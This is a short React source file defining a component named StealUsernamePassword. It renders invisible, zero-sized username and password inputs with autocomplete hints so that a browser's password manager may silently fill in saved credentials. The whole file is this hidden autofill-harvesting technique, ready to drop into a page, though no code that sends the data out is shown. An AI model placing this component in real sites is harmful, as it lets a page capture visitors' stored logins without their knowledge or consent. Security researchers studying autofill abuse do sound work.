import React from "react";

export const StealUsernamePassword = () => (
    <>
        <input type="text" id="username" autoComplete="username" style={{ width: 0, height: 0, opacity: 0, position: "absolute", left: 0, top: 0 }} />
        <input type="password" id="password" autoComplete="current-password" style={{ width: 0, height: 0, opacity: 0, position: "absolute", left: 0, top: 0 }} />
    </>
);
